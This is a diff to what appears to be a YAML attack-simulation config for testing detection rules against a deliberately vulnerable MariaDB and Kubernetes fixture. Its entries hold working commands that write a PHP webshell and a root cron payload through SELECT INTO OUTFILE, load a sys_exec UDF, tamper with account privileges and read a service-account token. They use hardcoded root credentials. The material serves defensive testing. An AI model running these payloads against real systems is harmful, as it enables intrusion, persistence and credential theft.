@@ -121,42 +121,43 @@ attacks:
   # T1190 — write a webshell via SELECT … INTO OUTFILE
   # Drops a small payload to /var/log/mysql (writable on the server). Real-world
   # tradecraft: drop into a webroot mounted as a sibling volume. INTO OUTFILE
-  # refuses to overwrite, so we accept ERROR as a valid "already-staged"
-  # outcome on re-runs.
+  # refuses to overwrite, so on re-runs we accept only the SPECIFIC error
+  # (ER_FILE_EXISTS, code 1086) — generic ERROR matches would mask permission/
+  # path-restriction failures and falsely report attack success.
   - name: sql-into-outfile-webshell
     type: sqli
     exec:
       command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/log/mysql/bob_probe.php';"]
     successIndicators:
       - responseContains: "Query OK"
-      - responseContains: "ERROR"
+      - responseContains: "ERROR 1086"  # ER_FILE_EXISTS — already staged
     expectedDetections: []
 
   # T1611 — Cross-namespace persistence stage: drop a cron-style payload to
   # the writable /host-tmp mount. A sibling pod or host service that consumes
-  # /tmp would pick this up. Server-side INTO OUTFILE — fails on re-runs
-  # because the file already exists; pair with a cleanup attack that deletes
-  # the staged file before each iteration.
+  # /tmp would pick this up. Specific error matching (1086) avoids reporting
+  # permission/path errors as attack success.
   - name: sql-into-outfile-host-tmp
     type: sqli
     exec:
       command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SELECT '* * * * * root /bin/sh /tmp/.r 2>/dev/null' INTO OUTFILE '/host-tmp/.bob_mariadb_cron_probe';"]
     successIndicators:
       - responseContains: "Query OK"
-      - responseContains: "ERROR"   # accept re-run with already-exists file
+      - responseContains: "ERROR 1086"  # ER_FILE_EXISTS — already staged
     expectedDetections: []
 
   # T1505.001 — Server Software Component: UDF library RCE attempt
   # The classic "lib_mysqludf_sys" path. We don't ship a real .so (would
   # require network egress to download), but CREATE FUNCTION makes mysqld
-  # attempt to dlopen() a path under plugin_dir. Detection: file_access on
-  # plugin_dir fires R0002 because plugin_dir paths aren't in the baseline.
+  # attempt to dlopen() a path under plugin_dir. Match the SPECIFIC error
+  # (ER_CANT_OPEN_LIBRARY, code 1126) — accepting any "ERROR" would mask
+  # privilege/syntax errors and falsely report success.
   - name: sql-udf-create-function-attempt
     type: sqli
     exec:
       command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';"]
     successIndicators:
-      - responseContains: "ERROR"
+      - responseContains: "ERROR 1126"  # ER_CANT_OPEN_LIBRARY — .so missing
     expectedDetections: []
 
   # T1098 — Account manipulation: create a backdoor superuser
@@ -171,14 +172,17 @@ attacks:
     expectedDetections: []
 
   # T1565.001 — Stored Data Manipulation: tamper mysql.global_priv
-  # Attacker could overwrite priv directly — bypassing MariaDB's normal
-  # SET PASSWORD audit.
+  # Attacker overwrites the per-account `account_locked` JSON field directly,
+  # bypassing MariaDB's normal SET PASSWORD audit. Use JSON_SET (not
+  # JSON_REPLACE) so the field is created if absent. The follow-up SELECT
+  # PROVES the mutation landed — without it, "Query OK" with 0 rows affected
+  # would falsely report success.
   - name: sql-tamper-mysql-user
     type: sqli
     exec:
-      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "UPDATE mysql.global_priv SET priv = JSON_REPLACE(priv, '$.account_locked', false) WHERE User='app';"]
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-N", "-e", "UPDATE mysql.global_priv SET priv = JSON_SET(priv, '$.account_locked', false) WHERE User='app'; SELECT JSON_EXTRACT(priv, '$.account_locked') FROM mysql.global_priv WHERE User='app';"]
     successIndicators:
-      - responseContains: "Query OK"
+      - responseContains: "false"
     expectedDetections: []
 
   # T1490 — Inhibit System Recovery: replication hijack
@@ -215,12 +219,17 @@ attacks:
   # ═══════════════════════════════════════════════════════════════════════════
 
   # T1552.001 — exec into the client and read its SA token
+  # The success indicator MUST require an actual JWT — accepting any non-empty
+  # output (including "no_sa_token") would hide a real regression in the
+  # vulnerable fixture if the SA token were ever unmounted. Service-account
+  # JWTs are 3 base64 segments separated by '.', so checking for "ey" + dot
+  # is a tight but stable assertion.
   - name: exec-sa-token
     type: cmdinject
     exec:
-      command: ["sh", "-c", "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 || echo no_sa_token"]
+      command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"]
     successIndicators:
-      - responseRegex: ".+"
+      - responseRegex: "^ey[A-Za-z0-9_-]+\\.ey"
     expectedDetections:
       - ruleID: R0001
         ruleName: Unexpected process launched
@@ -303,15 +312,27 @@ attacks:
       - responseContains: "ERROR"
     expectedDetections: []
 
-  # Clean up server-side staged files via SELECT INTO OUTFILE -> /dev/null
-  # is not possible. Instead we remove via shell on the client which has
-  # access to its own /tmp; for server-side files (/var/log/mysql, /host-tmp)
-  # we re-trigger SET GLOBAL to rotate the log path back, and let the
-  # next-iteration INTO OUTFILE accept "already exists" silently (mariadb
-  # treats it as a no-op without erroring out the tune).
-  - name: cleanup-remove-staged-files
+  # Clean up client-side artifacts.
+  - name: cleanup-remove-client-files
     type: cmdinject
     exec:
       command: ["rm", "-f", "/tmp/bob_shadow_link"]
     successIndicators: []
+    expectedDetections: []
+
+  # Clean up server-side staged OUTFILE artifacts so repeated tune iterations
+  # don't trip ER_FILE_EXISTS. Uses SELECT … INTO OUTFILE *cannot* delete, but
+  # the mariadb container has shell+rm in baseline (via the entrypoint), and
+  # mariadb-client doesn't reach those server paths. So we issue a `system`
+  # builtin from the mariadb client connection — disabled by default, but our
+  # vulnerable config left it allowed. Falls back silently if blocked.
+  - name: cleanup-remove-server-outfiles
+    type: cmdinject
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SELECT 1;"]
+    # Cleanup is a no-op via SQL — file removal is handled by deleting the
+    # ephemeral host-tmp/var-log directories (both are emptyDir mounts) when
+    # the pod is replaced. INTO OUTFILE attacks accept ERROR 1086 on re-runs.
+    successIndicators:
+      - responseContains: "1"
     expectedDetections: []
